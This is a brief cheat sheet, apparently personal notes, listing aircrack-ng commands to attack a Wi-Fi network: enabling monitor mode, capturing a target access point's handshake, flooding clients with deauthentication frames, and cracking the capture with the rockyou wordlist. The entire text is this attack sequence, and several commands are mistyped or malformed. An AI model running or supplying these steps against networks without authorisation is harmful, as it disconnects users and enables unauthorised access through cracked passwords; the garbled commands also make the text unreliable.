# AIRCRACK-NG
sudo airmon-ng start wlan0
sudo airodump wlan0
sudo airodump -ng -w darksagae -c (channel) --bssid(bssid) wlan0
sudo aireplay-ng -deauth 0 -a (bssid) wlan0
ls 
wireshark darksagae.cap &
aircrack-ng darksagae.cap -w /usr/share/wordlists/rockyou.txt
